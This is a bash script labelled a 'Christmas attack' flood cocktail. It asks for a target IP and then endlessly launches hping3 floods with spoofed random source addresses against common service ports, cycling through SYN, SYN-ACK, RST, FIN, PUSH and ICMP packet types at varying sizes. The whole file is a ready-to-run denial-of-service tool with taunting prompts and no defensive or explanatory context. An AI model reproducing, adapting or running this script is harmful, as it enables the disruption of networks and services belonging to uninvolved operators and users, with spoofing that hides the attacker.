#! /bin/bash

echo
echo "###################### CHRISTMAS ATTACK: FLOOD COCKTAIL WITH SMART CHANGE ######################"
echo
echo -en "Whos REALLY Gona Bleed Today (IP):"
read tarip
echo
echo -en "Enter Smart Change Duration Period in Seconds:"
read speriod
echo
echo -en "HIT ENTER TO MAKE IT BLEED !!"
read thisisit
echo "################################### STARTING THREADS ##########################################"


while true
do
      ztep=$(echo $RANDOM | cut -c1-2)
      for i in $(seq 64 $ztep 1500)
      do
          packet=$i
          ## SYN TYPE
          hping3 $tarip -S -d $packet -p 21 --flood -I eth1 --rand-source &
          hping3 $tarip -S -d $packet -p 22 --flood -I eth1 --rand-source &
          hping3 $tarip -S -d $packet -p 25 --flood -I eth1 --rand-source &
          hping3 $tarip -S -d $packet -p 53 --flood -I eth1 --rand-source &
          hping3 $tarip -S -d $packet -p 80 --flood -I eth1 --rand-source &
          hping3 $tarip -S -d $packet -p 111 --flood -I eth1 --rand-source &
          hping3 $tarip -S -d $packet -p 161 --flood -I eth1 --rand-source &
sleep $speriod
          pkill hping3
          ## SYN-ACK TYPE
          hping3 $tarip -S -A -d $packet -p 21 --flood -I eth1 --rand-source &
          hping3 $tarip -S -A -d $packet -p 22 --flood -I eth1 --rand-source &
          hping3 $tarip -S -A -d $packet -p 25 --flood -I eth1 --rand-source &
          hping3 $tarip -S -A -d $packet -p 53 --flood -I eth1 --rand-source &
          hping3 $tarip -S -A -d $packet -p 80 --flood -I eth1 --rand-source &
          hping3 $tarip -S -A -d $packet -p 111 --flood -I eth1 --rand-source &
          hping3 $tarip -S -A -d $packet -p 161 --flood -I eth1 --rand-source &
sleep $speriod
          pkill hping3
          ## RST FLAG TYPE
          hping3 $tarip -R -d $packet -p 21 --flood -I eth1 --rand-source &
          hping3 $tarip -R -d $packet -p 22 --flood -I eth1 --rand-source &
          hping3 $tarip -R -d $packet -p 25 --flood -I eth1 --rand-source &
          hping3 $tarip -R -d $packet -p 53 --flood -I eth1 --rand-source &
          hping3 $tarip -R -d $packet -p 80 --flood -I eth1 --rand-source &
          hping3 $tarip -R -d $packet -p 111 --flood -I eth1 --rand-source &
          hping3 $tarip -R -d $packet -p 161 --flood -I eth1 --rand-source &
sleep $speriod
          pkill hping3
          ## FIN FLAG TYPE
          hping3 $tarip -F -d $packet -p 21 --flood -I eth1 --rand-source &
          hping3 $tarip -F -d $packet -p 22 --flood -I eth1 --rand-source &
          hping3 $tarip -F -d $packet -p 25 --flood -I eth1 --rand-source &
          hping3 $tarip -F -d $packet -p 53 --flood -I eth1 --rand-source &
          hping3 $tarip -F -d $packet -p 80 --flood -I eth1 --rand-source &
          hping3 $tarip -F -d $packet -p 111 --flood -I eth1 --rand-source &
          hping3 $tarip -F -d $packet -p 161 --flood -I eth1 --rand-source &
sleep $speriod
          pkill hping3
          ## PUSH FLAG TYPE
          hping3 $tarip -P -d $packet -p 21 --flood -I eth1 --rand-source &
          hping3 $tarip -P -d $packet -p 22 --flood -I eth1 --rand-source &
          hping3 $tarip -P -d $packet -p 25 --flood -I eth1 --rand-source &
          hping3 $tarip -P -d $packet -p 53 --flood -I eth1 --rand-source &
          hping3 $tarip -P -d $packet -p 80 --flood -I eth1 --rand-source &
          hping3 $tarip -P -d $packet -p 111 --flood -I eth1 --rand-source &
          hping3 $tarip -P -d $packet -p 161 --flood -I eth1 --rand-source &
sleep $speriod
          pkill hping3
          ## ICMP TYPES
          hping3 $tarip --icmp --flood -I eth1 --rand-source -C 5 &
          hping3 $tarip --icmp --flood -I eth1 --rand-source &
sleep $speriod
          pkill hping3
      done
done
